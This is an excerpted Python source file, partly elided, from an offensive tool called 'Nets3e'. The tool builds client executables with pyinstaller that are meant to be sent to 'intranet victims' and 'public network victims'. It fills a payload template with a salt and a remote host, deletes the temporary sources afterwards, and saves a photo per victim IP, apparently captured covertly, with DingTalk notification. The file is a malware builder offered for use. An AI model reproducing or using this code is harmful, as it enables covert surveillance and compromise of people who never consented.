...
version = "@Мартин. Nets3e Tool V1.1.4 for Windows or Linux"
title = '''
************************************************************************************
...
class MainServer():
    ...
    def __generatePayload__(self):
        ...
        payload_debug = payload_debug.replace('@SALT',self.__salt)
        if self.echo:
            payload_debug = payload_debug.replace('@ECHO',"True")
        ...
        try:
            if self.rhost:
                ...
                payload_release = payload_release.replace('@SALT', self.__salt)
                if self.echo:
                    payload_release = payload_release.replace('@ECHO', "True")
                with open('./Plugin/Nets3e/temp_release.py', 'wb') as f:
                    f.write(payload_release.encode('utf-8'))
            with open('./Plugin/Nets3e/temp_debug.py', 'wb') as f:
                f.write(payload_debug.encode('utf-8'))
        except Exception as e:
            print(e)
            pass
        else:
            logger.warning('Generating debug version (you can send this version to intranet victims)')
            result_debug = subprocess.call(f'pyinstaller -F ./Plugin/Nets3e/temp_debug.py -n Nets3eClient_debug --distpath ./Device/Output/Nets3e/', shell=True,
                                           stdout=subprocess.DEVNULL,
                                           stderr=subprocess.DEVNULL)
            if self.rhost:
                logger.warning('Generating a release version (you can send it to public network victims)')
                result_release = subprocess.call(f'pyinstaller -F ./Plugin/Nets3e/temp_release.py -n Nets3eClient_release --distpath ./Device/Output/Nets3e/', shell=True, stdout=subprocess.DEVNULL,
                                              stderr=subprocess.DEVNULL)
            if not result_debug :
                if not result_release:
                    subprocess.call('del "./Plugin/Nets3e/temp_release.py"', shell=True, stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL)
                subprocess.call('del "./Plugin/Nets3e/temp_debug.py"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True
            else:
    ...
    def __load_ip_conf(self):
        with open('./Plugin/Nets3e/GETIP.conf','r',encoding='utf-8')as f:
    ...
    def __load_dingtalk_conf(self):
            with open('./Plugin/Nets3e/DingTalk.conf','r',encoding='utf-8')as f:
    ...
    def __saveLog__(self,ip, photo):
        ...
        img.save(f"./Plugin/Nets3e/IP_Photo/{ip}.png")
        logger.info(f"The victim {ip} information has been saved! ./Plugin/Nets3e/IP_Photo/{ip}.png")
    ...
    async def __run__(self):
        if self.generate:
            ...
            if self.__generatePayload__():
                logger.info('The PAYLOAD construction was successful, and the directory is located in ./Device/Output/Nets3e/')
            else:
...
if __name__ == '__main__':
    ...
    parser.add_argument('-echo', '--ECHO', action='store_true', help='Victim Echo')
